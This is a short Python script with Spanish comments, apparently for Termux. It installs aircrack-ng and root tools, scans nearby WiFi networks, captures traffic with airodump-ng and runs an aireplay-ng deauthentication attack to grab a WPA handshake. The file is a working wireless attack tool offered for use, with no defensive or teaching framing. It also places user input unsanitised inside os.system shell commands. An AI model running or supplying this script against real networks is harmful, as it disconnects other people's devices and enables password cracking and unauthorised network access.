import os
import subprocess

def instalar_dependencias():
    # Instalar dependencias necesarias
    os.system('pkg update && pkg upgrade')
    os.system('pkg install root-repo')
    os.system('pkg install tsu')
    os.system('pkg install python')
    os.system('pkg install git')
    os.system('pkg install aircrack-ng')
    os.system('pip install scapy')

def escanear_redes():
    # Escanear redes WiFi disponibles
    resultado = subprocess.check_output(['tsu', '-c', 'iwlist wlan0 scan'], universal_newlines=True)
    redes = []
    for linea in resultado.split('\n'):
        if "ESSID" in linea:
            essid = linea.split(':')[1].strip().strip('"')
            redes.append(essid)
    return redes

def capturar_paquetes(bssid, channel):
    # Capturar paquetes de una red específica
    os.system(f'tsu -c "airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0"')

def ataque_desautenticacion(bssid):
    # Realizar un ataque de desautenticación para capturar el handshake
    os.system(f'tsu -c "aireplay-ng --deauth 10 -a {bssid} wlan0"')

if __name__ == "__main__":
    instalar_dependencias()
    redes = escanear_redes()
    print("Redes disponibles:")
    for i, red in enumerate(redes):
        print(f"{i + 1}. {red}")
    
    seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
    red_seleccionada = redes[seleccion]
    
    bssid = input(f"Introduce el BSSID de la red {red_seleccionada}: ")
    canal = input(f"Introduce el canal de la red {red_seleccionada}: ")
    
    capturar_paquetes(bssid, canal)
    ataque_desautenticacion(bssid)






